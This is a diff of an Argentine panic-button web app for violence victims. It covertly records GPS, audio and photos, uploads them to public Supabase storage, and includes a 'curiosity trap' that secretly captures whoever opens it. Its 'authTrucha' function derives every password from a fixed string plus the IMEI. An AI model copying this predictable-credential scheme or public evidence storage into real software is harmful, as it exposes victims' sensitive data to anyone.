+ <button class="btn blanco" onclick="window.sigilo()" style="margin-top:12px;">MODO SIGILO (SIMULAR APAGADO)</button>
+</section>
+
+<section id="registro" class="vista">
+ <button class="btn volver" onclick="ir('inicio')">VOLVER</button>
+ <h2 class="tit">ACTIVACIÓN GRATUITA</h2>
+ <div class="caja">
+  <div class="campo"><label>NOMBRE Y APELLIDO</label><input id="rN" placeholder="Nombre de la persona protegida"></div>
+  <div class="campo" style="display:none;"><label>IMEI 15 DIGITOS</label><input id="rI" inputmode="numeric" maxlength="15" placeholder="Ej: 351234567890123"></div>
+  <div class="campo"><label>TU NUMERO DE CELULAR</label><input id="rW" inputmode="tel" placeholder="Para validar tus 15 días gratis"></div>
+  <div class="campo"><label>CONTACTO FAMILIAR 1 (SMS)</label><input id="cF1" inputmode="tel" placeholder="Celular para recibir alerta SMS"></div>
+  <div class="campo"><label>CONTACTO FAMILIAR 2 (EMAIL)</label><input id="cE1" type="email" placeholder="Email de respaldo para emergencia"></div>
+  <button class="btn" onclick="alta()">OBTENER 15 DIAS GRATIS</button>
+ </div>
+</section>
+
+<section id="pago" class="vista">
+ <button class="btn volver" onclick="ir('inicio')">VOLVER</button>
+ <h2 class="tit">BOVEDA - PLANES</h2>
+ <div class="caja">
+   <div class="campo">
+     <label style="text-align:center;">ID / IMEI ASIGNADO</label>
+     <div id="pI_display" style="text-align:center;font-size:26px;font-family:'JetBrains Mono',monospace;font-weight:800;color:var(--oroOscuro);padding:18px;background:#FFFCF2;border-radius:12px;border:2px dashed var(--oroMedio);"></div>
+     <input type="hidden" id="pI">
+   </div>
+   <div style="background:#FAFAFA;border:1px solid #DDD;padding:15px;border-radius:8px;margin-bottom:20px;text-align:center;">
+       <b style="color:var(--oroOscuro);display:block;margin-bottom:5px;font-size:18px;">ALIAS: noir.elite.ceo</b>
+       <span style="font-family:'JetBrains Mono',monospace;font-size:14px;color:#555;">CBU: 0110257630025717844115</span>
+   </div>
+   <p style="text-align:center;font-size:14px;margin-bottom:20px;">1. Seleccioná el plan mensual y transferí al Alias.</p>
+   
+   <div class="plan" onclick="alert('Transferí $5.900 al Alias: noir.elite.ceo y luego subí el comprobante abajo.')"><div class="n">PLAN MENSUAL</div><div class="p">$ 5.900</div></div>
+   
+   <div class="campo" style="margin-top:20px;">
+     <label>2. SUBIR COMPROBANTE DE PAGO (IA)</label>
+     <div class="file-upload-wrapper">
+       <div class="file-upload-text" id="fileName">TOCÁ AQUÍ PARA SELECCIONAR<br>LA IMAGEN DEL RECIBO</div>
+       <input type="file" id="comprobante" accept="image/*" onchange="document.getElementById('fileName').innerHTML = 'COMPROBANTE SELECCIONADO'">
+     </div>
+   </div>
+   <button class="btn" onclick="procesarPagoIA()">VERIFICAR PAGO CON IA</button>
+ </div>
+ <button class="btn blanco" onclick="ir('login')">YA TENGO LLAVE C4</button>
+</section>
+
+<section id="llave" class="vista" style="align-items:center;text-align:center">
+ <button class="btn volver" onclick="ir('inicio')" style="align-self:flex-start;margin-bottom:10px;">VOLVER AL INICIO</button>
+ <h2 class="tit">LLAVE MAESTRA C4</h2>
+ <div class="caja" style="width:100%">
+  <div class="llave" id="lk">C4-XXXX-XXXX</div>
+  <p style="font-weight:600;color:#555;margin-top:18px;font-size:15px;letter-spacing:1px;">ÚNICA - INTRANSFERIBLE - VÁLIDA JUDICIALMENTE</p>
+  
+  <div style="background:#FFF3F5;border:1px solid #8B0000;padding:16px;border-radius:12px;margin-top:22px;text-align:left;box-shadow:var(--luz);">
+    <b style="color:#8B0000;font-family:'Cinzel',serif;font-size:14px;letter-spacing:1px;display:block;margin-bottom:8px;">INSTRUCCION VITAL</b>
+    <span style="font-size:13.5px;color:#333;font-weight:600;line-height:1.5;display:block;">Si activas el sistema por accidente o querés apagar el temporizador centinela, te pedirá que ingreses esta Llave Maestra para confirmar que sos vos. <b>MEMORIZALA.</b></span>
+  </div>
+
+  <div style="display:flex;gap:12px;margin-top:25px;flex-wrap:wrap;justify-content:center">
+   <button class="btn blanco" onclick="navigator.clipboard.writeText(document.getElementById('lk').textContent).then(()=>alert('Copiada correctamente'))">COPIAR</button>
+   <button class="btn" onclick="navigator.share?.({text:document.getElementById('lk').textContent})">COMPARTIR</button>
+  </div>
+ </div>
+ <button class="btn" onclick="ir('inicio')">COMENZAR A USAR LA APP</button>
+</section>
+
+<section id="login" class="vista">
+ <button class="btn volver" onclick="ir('inicio')">VOLVER</button>
+ <h2 class="tit">ACCESO JUDICIAL</h2>
+ <div class="caja">
+  <p style="text-align:center;font-size:14px;margin-bottom:15px;color:#555;font-weight:600;">Ingresá tu Llave Maestra C4 para activar tu protección y acceder a tus actas.</p>
+  <div class="campo" style="display:none;"><label>IMEI / ID DEL EQUIPO (OPCIONAL)</label><input id="lkImei" inputmode="numeric" maxlength="15" placeholder="Dejar vacío"></div>
+  <div class="campo" style="position:relative;">
+    <label>LLAVE MAESTRA C4</label>
+    <input id="lkI" placeholder="C4-XXXX-XXXX" style="text-align:center;font-size:20px;letter-spacing:4px;text-transform:uppercase;font-weight:800;padding-right:85px;">
+    <button onclick="pegarLlave('lkI')" style="position:absolute;right:8px;top:36px;background:var(--oro);color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:900;cursor:pointer;font-family:'Cinzel',serif;font-size:12px;">PEGAR</button>
+  </div>
+  <button class="btn" onclick="validar()">INGRESAR AL PANEL</button>
+ </div>
+</section>
+
+<section id="sos" class="vista">
+ <button class="btn volver" onclick="if(window.sosActivo){ prepararParada('sos'); }else{window.ir('inicio');}" style="position:relative;z-index:9999;">ATRAS</button>
+ <h2 class="tit">PROTECCION ACTIVA</h2>
+ <div class="sos"><div class="onda"></div><div class="onda d2"></div><div class="onda d3"></div><button class="bSOS" id="btnBigSOS" onclick="if(window.sosActivo){ prepararParada('sos'); } else { disparoSOS('manual'); }">S.O.S</button></div>
+ <div class="estadoSOS" id="st">
+   <h2 style="font-size:18px;letter-spacing:2px;margin-bottom:8px;">¡SISTEMA ACTIVADO!</h2>
+   NUESTRA EMPRESA ESTÁ RECABANDO LA EVIDENCIA EN SUPABASE STORAGE<br>
+   GPS SEGUNDO A SEGUNDO - AUDIO CONTINUO - FOTOS DEL ENTORNO - CELDA Y WIFI<br><br>
+   <span style="font-size:12px;color:#888;font-weight:400;">(Las alertas de emergencia ya fueron despachadas a tu círculo)</span><br><br>
+   <div style="background:#FFE79B;color:#5A3E00;padding:10px;border-radius:8px;font-weight:700;margin-top:12px;font-size:12px;line-height:1.4;">
+    ¿ACTIVACIÓN ACCIDENTAL?<br>Tocá el botón "DETENER S.O.S" e ingresá tu Llave Maestra.
+   </div>
+ </div>
+</section>
+
+<section id="bitacora" class="vista">
+ <button class="btn volver noimp" onclick="ir('inicio')">VOLVER</button>
+ <h2 class="tit">DIARIO DE INCIDENTES</h2>
+ <div class="caja noimp">
+  <p style="font-size:13.5px;color:#444;margin-bottom:15px;text-align:center;line-height:1.5;">
+   Registrá amenazas, agresiones, acoso, capturas de mensajes, fotos, audios o videos en orden cronológico para exportar tu informe documental y presentarlo ante tu abogado o fiscalía.
+  </p>
+  <div class="campo">
+   <label>TIPO DE INCIDENTE</label>
+   <input id="bTipo" placeholder="Ej: Amenaza, Agresión física, Acoso, Mensajes">
+  </div>
+  <div class="campo">
+   <label>FECHA Y HORA DEL HECHO</label>
+   <input id="bFecha" type="datetime-local">
+  </div>
+  <div class="campo">
+   <label>LUGAR DEL INCIDENTE</label>
+   <input id="bLugar" placeholder="Dirección, barrio o referencia (Opcional)">
+  </div>
+  <div class="campo">
+   <label>RELATO DETALLADO DE LO OCURRIDO</label>
+   <input id="bRelato" placeholder="Describí qué pasó, testigos o detalles clave">
+  </div>
+  <div class="campo">
+   <label>ADJUNTAR ARCHIVOS ORIGINALES (FOTOS, CAPTURAS, AUDIO O VIDEO)</label>
+   <div class="file-upload-wrapper">
+    <div class="file-upload-text" id="bFileName">TOCÁ AQUÍ PARA SUMAR ARCHIVOS<br>SE ACUMULAN TODOS HASTA GUARDAR</div>
+    <input type="file" id="bArchivos" multiple accept="image/*,video/*,audio/*" onchange="agregarArchivosBitacora(this)">
+   </div>
+   <div style="font-size:11.5px;color:#8B0000;text-align:center;margin-top:8px;font-weight:700;letter-spacing:1px;">Podés ir tocando varias veces: cada audio, foto o video se suma a la lista. Nada se borra hasta que guardes.</div>
+   <div id="listaArchivosPendientes" style="margin-top:14px;"></div>
+   <input type="file" id="inputAgregarEvidencia" multiple accept="image/*,video/*,audio/*" style="display:none">
+  </div>
+  <button class="btn" id="btnGuardarBitacora" onclick="guardarIncidente()">GUARDAR EN CRONOLOGÍA</button>
+ </div>
+
+ <div class="caja">
+  <h3>CRONOLOGÍA EXPORTABLE</h3>
+  <button class="btn blanco noimp" onclick="window.print()" style="margin-bottom:18px;">🖨️ EXPORTAR / IMPRIMIR INFORME (PDF)</button>
+  <div id="listaBitacora"></div>
+  <p style="font-size:11px;color:#777;text-align:center;margin-top:15px;line-height:1.4;">
+   Nota legal: Se conservan los archivos digitales originales con sello SHA-256 como respaldo documental para consulta jurídica o autoridad competente.
+  </p>
+ </div>
+</section>
+
+<section id="recuperar" class="vista">
+ <button class="btn volver" onclick="ir('inicio')">VOLVER</button>
+ <h2 class="tit">TRAMPA DE CURIOSIDAD Y S.O.S. REMOTO</h2>
+ <div class="caja">
+  <p style="font-size:14px;color:#555;margin-bottom:15px;text-align:center;line-height:1.6;">Ingresá únicamente tu <b>Llave Maestra C4</b> para recuperar tu protección y volver a habilitar tu Botón S.O.S., o para armar la alarma a distancia en tu teléfono robado (cuando el delincuente intente abrir la app por curiosidad, el sistema detonará de forma invisible capturando su rostro, audio y GPS).</p>
+  <div class="campo" style="display:none;"><label>IMEI / ID DEL EQUIPO RASTREADO (OPCIONAL)</label><input id="rrI" inputmode="numeric" maxlength="15" placeholder="Opcional"></div>
+  <div class="campo" style="position:relative;">
+    <label>LLAVE MAESTRA C4</label>
+    <input id="rrL" placeholder="C4-XXXX-XXXX" style="text-align:center;font-size:20px;letter-spacing:4px;text-transform:uppercase;font-weight:800;padding-right:85px;">
+    <button onclick="pegarLlave('rrL')" style="position:absolute;right:8px;top:36px;background:var(--oro);color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:900;cursor:pointer;font-family:'Cinzel',serif;font-size:12px;">PEGAR</button>
+  </div>
+  <button class="btn" onclick="recuperar('restaurar')">RESTAURAR MI CUENTA Y BOTÓN S.O.S</button>
+  <button class="btn rubi" onclick="recuperar('detonar')" style="margin-top:18px">ARMAR TRAMPA DE RASTREO REMOTO</button>
+ </div>
+</section>
+
+<section id="panel" class="vista">
+ <h2 class="tit" style="text-align:left;border-bottom:1px solid var(--oro);padding-bottom:10px;letter-spacing:5px">CENTRO JUDICIAL P4</h2>
+ <div class="noimp" style="display:flex;gap:12px;flex-wrap:wrap">
+  <button class="btn" onclick="window.print()" style="flex:1 1 100%">IMPRIMIR ACTA JUDICIAL (PDF)</button>
+  <button class="btn blanco" onclick="verificar()" style="flex:1 1 100%;margin-top:10px;">VERIFICAR FIRMAS DIGITALES</button>
+ </div>
+ <div id="alertas"><div class="caja" style="text-align:center;padding:50px 12px;border:none;box-shadow:none;"><p style="color:#999;font-weight:400;font-family:'Cormorant Garamond',serif;font-style:italic;font-size:20px;">Sistema en calma - Sin emergencias</p></div></div>
+ <button class="btn blanco noimp" onclick="ir('inicio')" style="margin-top:20px">VOLVER AL INICIO</button>
+</section>
+</main>
+
+<div id="modalPresentacion">
+   <div class="caja" style="max-width:540px;width:100%;background:#FFFFFF;border:2px solid var(--oro);padding:25px;max-height:85vh;overflow-y:auto;text-align:center;">
+     <h3 style="margin-bottom:12px;">PRESENTACIÓN DEL SISTEMA</h3>
+     <p id="textoPresentacionModal" style="font-size:15px;color:#222;line-height:1.7;text-align:left;margin-bottom:20px;font-weight:500;">
+       Bienvenidas al sistema judicial <b>Energy Argentina 2026</b>, plataforma corporativa <b>Ni Una Menos</b>.<br><br>
+       Nuestra misión es salvar vidas mediante dos herramientas principales: el <b>Botón Antipánico</b> de impacto inmediato y el <b>Temporizador Centinela</b>.<br><br>
+       • <b>Temporizador Centinela:</b> Si vas a salir, programá el tiempo de tu viaje y bloqueá la pantalla usando el <b>Modo Sigilo</b>. Si no cancelás el cronómetro antes de que termine, el sistema asumirá que estás en peligro y detonará automáticamente la recolección de evidencia.<br><br>
+       • <b>Sensores en Modo Sigilo:</b> Con la pantalla negra simulando estar apagada, si recibís un sacudón violento o pegás un grito fuerte de auxilio, se activará inmediatamente la alarma de rescate sin hacer ruido.<br><br>
+       • <b>Validez Judicial:</b> El sistema recaba fotos, videos, audios y GPS en un <b>Acta Pericial P4</b> lista para presentar en fiscalía.
+     </p>
+     <button class="btn" onclick="ir('registro');cerrarPresentacion();" style="margin-bottom:10px;">OBTENER MIS 15 DÍAS GRATIS</button>
+     <button class="btn blanco" onclick="cerrarPresentacion()">CERRAR PRESENTACIÓN</button>
+   </div>
+</div>
+
+<div id="modalStop">
+   <h3 style="color:#FFF;font-family:'Cinzel',serif;margin-bottom:20px;font-size:24px;letter-spacing:3px;">CONFIRMAR ACCIÓN</h3>
+   <p style="color:#DDD;text-align:center;margin-bottom:25px;font-size:15px;font-weight:600;">Ingresá tu Llave Maestra para confirmar tu identidad y desactivar la seguridad.</p>
+   <div class="campo" style="position:relative;width:100%;max-width:400px;margin-bottom:0;">
+     <input id="lkStop" placeholder="C4-XXXX-XXXX" style="text-align:center;font-size:20px;letter-spacing:4px;text-transform:uppercase;font-weight:800;padding-right:85px;width:100%;border:2px solid var(--oro);">
+     <button onclick="pegarLlave('lkStop')" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);background:var(--oro);color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:900;cursor:pointer;font-family:'Cinzel',serif;font-size:12px;">PEGAR</button>
+   </div>
+   <button class="btn rubi" onclick="confirmarParar()" style="margin-top:25px;width:100%;max-width:400px;">CONFIRMAR DESACTIVACIÓN</button>
+   <button class="btn blanco" onclick="document.getElementById('modalStop').style.display='none'" style="margin-top:15px;width:100%;max-width:400px;background:rgba(255,255,255,0.1);color:#FFF;border-color:#FFF;">CANCELAR</button>
+</div>
+
+<div class="footer-wrap">
+ <div class="scroll-container"><div class="scroll-text">NI UNA MENOS ARGENTINA - niunamenosarg.com - ACTA P4 - CADENA DE CUSTODIA - LEY 26.485 - LEY 25.326 - CODIGO PROCESAL PENAL - SHA-256 + SHA-3 + HMAC - GPS - AUDIO CONTINUO - FOTOS - SENSORES Y ANTENAS - MODO SIGILO - 15 DIAS DE PRUEBA GRATIS -</div></div>
+ <footer><strong>NI UNA MENOS - ENERGY 2026</strong><br>niunamenosarg.com - Custodia Judicial Forense - Empresa líder en protección civil<br>MMXXVI - Hecho en la República Argentina</footer>
+</div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+const SUPA_URL = 'https://drpjcmznauposqlhaveo.supabase.co';
+const SUPA_KEY = 'sb_publishable_xo7-uUQqtWvEWoLGqqlrsg_rxdroLx4';
+const SUPA_BUCKET = 'evidencias_c4';
+
+const SHAKE_THRESHOLD = 2.8; 
+const SHAKE_COOLDOWN = 4000; 
+const EXPIRACION_ACTA_MS = 86400000;
+
+let cooldownRobo = false;
+let sensoresActivos = false;
+let gravedad = [0, 0, 0];
+const FILTRO_GRAVEDAD = 0.8;
+let currentJWT = null;
+let wakeLockObj = null;
+let audioKeepAlive = null;
+let listaActas = [];
+let mapas = {};
+
+window.sosActivo = false;
+window.bloqueoDisparo = false; 
+window.origenSOS = 'manual'; 
+window.stopTarget = 'sos'; 
+let gps=null, aid=null;
+
+let centinelaInterval = null;
+let archivosPendientesBitacora = [];
+let idIncidenteAgregarEvidencia = null;
+
+let audioCtxActivo = null;
+let micStreamSigilo = null;
+let voiceActive = false;
+
+function blobToDataURL(blob) {
+    return new Promise((resolve) => {
+        if (!blob || !(blob instanceof Blob)) {
+            resolve(null);
+            return;
+        }
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.onerror = () => resolve(null);
+        reader.readAsDataURL(blob);
+    });
+}
+
+function dataURLtoBlob(dataurl) {
+    try {
+        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+        return new Blob([u8arr], {type:mime});
+    } catch(e) { return null; }
+}
+
+async function forzarDescargaArchivo(url, nombreArchivo) {
+    try {
+        if (!url) return;
+        const nombreFinal = (nombreArchivo || 'evidencia_c4').replace(/[^a-zA-Z0-9._-]/g, '_');
+        if (url.includes('/storage/v1/object/public/')) {
+            const sep = url.includes('?') ? '&' : '?';
+            window.location.href = url + sep + 'download=' + encodeURIComponent(nombreFinal);
+            return;
+        }
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const blobUrl = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = blobUrl;
+        a.download = nombreFinal;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 4000);
+    } catch (e) {
+        window.open(url, '_blank');
+    }
+}
+
+async function subirArchivoBucket(blobOrDataUrl, actaId, carpeta, ext, contentType) {
+    try {
+        await asegurarSesionSupabase();
+        let blob = blobOrDataUrl;
+        if (typeof blobOrDataUrl === 'string' && blobOrDataUrl.startsWith('data:')) {
+            blob = dataURLtoBlob(blobOrDataUrl);
+        }
+        if (!blob) return (typeof blobOrDataUrl === 'string') ? blobOrDataUrl : null;
+
+        const fileName = `${actaId}/${carpeta}_${Date.now()}_${Math.random().toString(36).slice(2,7)}.${ext}`;
+        const token = currentJWT ? currentJWT : SUPA_KEY;
+
+        const res = await fetch(`${SUPA_URL}/storage/v1/object/${SUPA_BUCKET}/${fileName}`, {
+            method: 'POST',
+            headers: {
+                'apikey': SUPA_KEY,
+                'Authorization': 'Bearer ' + token,
+                'Content-Type': contentType,
+                'x-upsert': 'true'
+            },
+            body: blob
+        });
+
+        if (res.ok) {
+            const publicUrl = `${SUPA_URL}/storage/v1/object/public/${SUPA_BUCKET}/${fileName}`;
+            debugLog('☁️ Subido al Bucket: ' + fileName);
+            return publicUrl;
+        } else {
+            debugLog('⚠️ Bucket sin permiso, usando respaldo Base64.');
+            if (typeof blobOrDataUrl === 'string') return blobOrDataUrl;
+            return await blobToDataURL(blob);
+        }
+    } catch(e) {
+        debugLog('Error Bucket Storage: ' + e.message);
+        if (typeof blobOrDataUrl === 'string') return blobOrDataUrl;
+        return await blobToDataURL(blobOrDataUrl);
+    }
+}
+
+async function limpiarArchivosBucketActa(acta) {
+    if (!acta) return;
+    try {
+        await asegurarSesionSupabase();
+        const token = currentJWT ? currentJWT : SUPA_KEY;
+        const urls = [];
+        if (acta.imagenes) acta.imagenes.forEach(i => { if(i.url) urls.push(i.url); });
+        if (acta.videos) acta.videos.forEach(v => { if(v.url) urls.push(v.url); });
+        if (acta.audios) acta.audios.forEach(a => { if(a.url) urls.push(a.url); });
+
+        const prefijo = `/storage/v1/object/public/${SUPA_BUCKET}/`;
+        for (const u of urls) {
+            if (typeof u === 'string' && u.includes(prefijo)) {
+                const filePath = u.split(prefijo)[1];
+                if (filePath) {
+                    fetch(`${SUPA_URL}/storage/v1/object/${SUPA_BUCKET}/${filePath}`, {
+                        method: 'DELETE',
+                        headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + token }
+                    }).catch(()=>{});
+                }
+            }
+        }
+    } catch(e) {}
+}
+
+let deferredPrompt;
+window.addEventListener('beforeinstallprompt', (e) => {
+  e.preventDefault();
+  deferredPrompt = e;
+  const installBtn = document.getElementById('btn-install-pwa');
+  installBtn.style.display = 'flex';
+  installBtn.addEventListener('click', async () => {
+    deferredPrompt.prompt();
+    const { outcome } = await deferredPrompt.userChoice;
+    if (outcome === 'accepted') {
+        installBtn.style.display = 'none';
+    }
+    deferredPrompt = null;
+  });
+});
+
+function debugLog(msg) {
+    console.log('[C4-DEBUG]', msg);
+    const panel = document.getElementById('debugPanel');
+    if(panel) {
+        const time = new Date().toLocaleTimeString('es-AR');
+        panel.innerHTML = '[' + time + '] ' + msg + '<br>' + panel.innerHTML;
+        panel.innerHTML = panel.innerHTML.split('<br>').slice(0,15).join('<br>');
+    }
+}
+
+const LK = k => {
+    let str = (k || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
+    if (str.startsWith('C4')) {
+        let rest = str.slice(2);
+        let parts = [];
+        for (let i = 0; i < rest.length; i += 4) parts.push(rest.slice(i, i + 4));
+        return 'C4' + (parts.length > 0 ? '-' + parts.join('-') : '');
+    }
+    return str;
+};
+const IM = i => (i||'').toString().replace(/\D/g,'').slice(0,15);
+
+document.getElementById('lkStop').addEventListener('input', e => e.target.value = LK(e.target.value));
+document.getElementById('lkI').addEventListener('input', e => e.target.value = LK(e.target.value));
+if(document.getElementById('rrL')) {
+    document.getElementById('rrL').addEventListener('input', e => e.target.value = LK(e.target.value));
+}
+
+async function asegurarSesionSupabase() {
+    if (currentJWT) return true;
+    const imeiGuardado = localStorage.getItem('imei') || '359999999999999';
+    return await authTrucha(imeiGuardado);
+}
+
+function pintarDiasEnPantalla(fechaIso, imeiSub) {
+    if (!fechaIso) return true;
+    localStorage.setItem('fecha_vencimiento', fechaIso);
+    const venci = new Date(fechaIso).getTime();
+    const ahora = Date.now();
+    const faltanMs = venci - ahora;
+    const faltanDias = Math.ceil(faltanMs / (1000 * 60 * 60 * 24));
+
+    const banner = document.getElementById('bannerSuscripcion');
+    const text = document.getElementById('diasRestantesText');
+    const cajaHeader = document.getElementById('cajaHeaderDias');
+    const tituloHeader = document.getElementById('tituloHeaderDias');
+    const subHeader = document.getElementById('subtituloHeaderDias');
+
+    if (faltanMs <= 0) {
+        localStorage.removeItem('ok');
+        ocultarBotonesSeguridad();
+        if (banner) banner.style.display = 'none';
+        if (tituloHeader) {
+            tituloHeader.innerText = '⚠️ BLINDAJE VENCIDO (0 DÍAS)';
+            tituloHeader.style.color = '#8B0000';
+        }
+        if (subHeader) {
+            subHeader.innerText = 'Tu período de protección ha finalizado. Renová tu plan mensual para reactivar el sistema.';
+        }
+        alert('TU BLINDAJE JUDICIAL HA VENCIDO.\\nPor favor, renová tu plan para mantener la protección activa.');
+        const imeiFinal = imeiSub || localStorage.getItem('imei') || '';
+        if (imeiFinal) {
+            document.getElementById('pI').value = imeiFinal;
+            if(document.getElementById('pI_display')) document.getElementById('pI_display').innerText = imeiFinal;
+        }
+        window.ir('pago');
+        return false;
+    }
+
+    const palabraDia = faltanDias === 1 ? 'DÍA' : 'DÍAS';
+    const palabraRestante = faltanDias === 1 ? 'RESTANTE' : 'RESTANTES';
+
+    if (cajaHeader && tituloHeader && subHeader) {
+        if (faltanDias <= 3) {
+            cajaHeader.style.background = '#FFF3F5';
+            cajaHeader.style.borderColor = '#8B0000';
+            tituloHeader.style.color = '#8B0000';
+            tituloHeader.innerText = '⚠️ TE QUEDAN ' + faltanDias + ' ' + palabraDia + ' GRATIS';
+            subHeader.innerText = 'Tu blindaje pericial vence pronto. Recordá renovar tu plan para no perder la cobertura.';
+        } else {
+            cajaHeader.style.background = '#FFFCF2';
+            cajaHeader.style.borderColor = 'var(--oro)';
+            tituloHeader.style.color = 'var(--oroOscuro)';
+            tituloHeader.innerText = '🛡️ ' + faltanDias + ' ' + palabraDia + ' ' + palabraRestante;
+            subHeader.innerText = 'Blindaje judicial activo. El contador descuenta automáticamente día por día.';
+        }
+    }
+
+    if (banner && text) {
+        banner.style.display = 'block';
+        if (faltanDias <= 3) {
+            banner.style.background = 'linear-gradient(135deg,#8B0000,#4A0008)';
+            banner.style.borderColor = '#FF8888';
+            text.innerText = '⚠️ ATENCIÓN: Te quedan ' + faltanDias + ' ' + palabraDia.toLowerCase() + ' de protección.';
+        } else {
+            banner.style.background = 'linear-gradient(135deg,#D4AF37,#A87F0A)';
+            banner.style.borderColor = '#FFF0A8';
+            text.innerText = 'Te quedan ' + faltanDias + ' ' + palabraDia.toLowerCase() + ' de protección judicial.';
+        }
+    }
+    return true;
+}
+
+async function verificarSuscripcion() {
+    const imei = localStorage.getItem('imei');
+    const k = localStorage.getItem('llave_maestra');
+    if (localStorage.getItem('ok') !== '1') return false;
+
+    let fechaLocal = localStorage.getItem('fecha_vencimiento');
+    if (!fechaLocal) {
+        let f = new Date();
+        f.setDate(f.getDate() + 15);
+        fechaLocal = f.toISOString();
+        localStorage.setItem('fecha_vencimiento', fechaLocal);
+    }
+
+    let sigueActivo = pintarDiasEnPantalla(fechaLocal, imei);
+    if (!sigueActivo) return false;
+
+    try {
+        await asegurarSesionSupabase();
+        const filtro = k ? ('llave_acceso=eq.' + LK(k)) : ('imei=eq.' + imei);
+        const res = await supaQuery('GET', 'c4_suscripciones?select=*&' + filtro);
+        
+        if (res && res.length > 0) {
+            const sub = res[0];
+            if (sub.imei && sub.imei !== imei) {
+                localStorage.setItem('imei', sub.imei);
+            }
+            if (sub.datos_acta) {
+                try {
+                    const actaRemota = JSON.parse(sub.datos_acta);
+                    if (actaRemota && actaRemota.sello_ms && (Date.now() - actaRemota.sello_ms > EXPIRACION_ACTA_MS)) {
+                        await limpiarArchivosBucketActa(actaRemota);
+                        await purgarActaVencidaEnSupabase(sub.imei, sub.llave_acceso);
+                    }
+                } catch(ePurga) {}
+            }
+            if (sub.fecha_vencimiento) {
+                return pintarDiasEnPantalla(sub.fecha_vencimiento, sub.imei);
+            }
+        }
+        return true;
+    } catch(e) { 
+        debugLog('Error verificando suscripción: ' + e.message); 
+        return pintarDiasEnPantalla(fechaLocal, imei); 
+    }
+}
+
+window.iniciarCentinela = function() {
+    let h = parseInt(document.getElementById('cHoras').value) || 0;
+    let m = parseInt(document.getElementById('cMin').value) || 0;
+    let totalMs = (h * 3600000) + (m * 60000);
+
+    if (totalMs <= 0) return alert('Por favor, ingresá un tiempo válido en horas o minutos.');
+
+    let endTime = Date.now() + totalMs;
+    localStorage.setItem('centinelaEnd', endTime);
+    
+    actualizarCrono();
+    centinelaInterval = setInterval(actualizarCrono, 1000);
+    
+    alert('MODO CENTINELA ACTIVADO.\\n\\nSi el cronómetro llega a cero y no ingresaste tu Llave Maestra, el sistema S.O.S se disparará automáticamente salvando tu vida.\\n\\nRECOMENDACIÓN: Para que el cronómetro detone con total precisión y los sensores queden alertas, activá obligatoriamente el "Modo Sigilo" ahora.');
+};
+
+function actualizarCrono() {
+    let end = parseInt(localStorage.getItem('centinelaEnd')) || 0;
+    if (!end) return;
+
+    let faltan = end - Date.now();
+    if (faltan <= 0) {
+        clearInterval(centinelaInterval);
+        centinelaInterval = null;
+        localStorage.removeItem('centinelaEnd');
+        let cronoEl = document.getElementById('cronoDisplay');
+        if(cronoEl) cronoEl.innerText = "00:00:00";
+        
+        let btn = document.getElementById('btnCentinela');
+        if(btn) { btn.innerText = 'ACTIVAR CENTINELA'; btn.classList.remove('rubi'); }
+        
+        if (!window.sosActivo) {
+            debugLog('Cronómetro Centinela finalizado. Disparando SOS.');
+            window.ir('sos');
+            disparoSOS('centinela');
+        }
+        return;
+    }
+
+    let h = Math.floor(faltan / 3600000);
+    let m = Math.floor((faltan % 3600000) / 60000);
+    let s = Math.floor((faltan % 60000) / 1000);
+
+    let display = (h < 10 ? '0'+h : h) + ':' + (m < 10 ? '0'+m : m) + ':' + (s < 10 ? '0'+s : s);
+    let cronoEl = document.getElementById('cronoDisplay');
+    if(cronoEl) {
+        cronoEl.innerText = display;
+        cronoEl.style.display = 'block';
+        let btn = document.getElementById('btnCentinela');
+        if(btn && !btn.classList.contains('rubi')) {
+            btn.innerText = 'CANCELAR CENTINELA';
+            btn.classList.add('rubi');
+        }
+    }
+}
+
+function checkCentinelaOnInit() {
+    let end = parseInt(localStorage.getItem('centinelaEnd')) || 0;
+    if (end > Date.now()) {
+        centinelaInterval = setInterval(actualizarCrono, 1000);
+        actualizarCrono();
+    } else if (end && end <= Date.now()) {
+        localStorage.removeItem('centinelaEnd');
+        if(localStorage.getItem('ok') === '1' && !window.sosActivo) {
+            window.ir('sos');
+            disparoSOS('centinela');
+        }
+    }
+}
+
+window.prepararParada = function(objetivo) {
+    window.stopTarget = objetivo; 
+    document.getElementById('modalStop').style.display = 'flex';
+    document.getElementById('lkStop').value = '';
+}
+
+async function authTrucha(imei) {
+    if (!imei) return false;
+    const email = imei + '@c4judicial.com.ar';
+    const password = 'C4_Sec2026!' + imei; 
+    try {
+        let res = await fetch(SUPA_URL + '/auth/v1/token?grant_type=password', {
+            method: 'POST',
+            headers: { 'apikey': SUPA_KEY, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        });
+        let data = await res.json();
+        if (!res.ok) {
+            let regRes = await fetch(SUPA_URL + '/auth/v1/signup', {
+                method: 'POST',
+                headers: { 'apikey': SUPA_KEY, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
+            let regData = await regRes.json();
+            if (!regRes.ok) return false;
+            data = regData; 
+        }
+        if (data.access_token) currentJWT = data.access_token;
+        else if (data.session && data.session.access_token) currentJWT = data.session.access_token;
+        else return false;
+        return true;
+    } catch (e) { debugLog('authTrucha error: ' + e.message); return false; }
+}
+
+async function supaQuery(method, endpoint, body) {
+    const token = currentJWT ? currentJWT : SUPA_KEY;
+    const options = {
+        method,
+        headers: { 
+            'apikey': SUPA_KEY, 
+            'Authorization': 'Bearer ' + token, 
+            'Content-Type': 'application/json', 
+            'Prefer': 'return=representation' 
+        }
+    };
+    if (body) options.body = JSON.stringify(body);
+    const res = await fetch(SUPA_URL + '/rest/v1/' + endpoint, options);
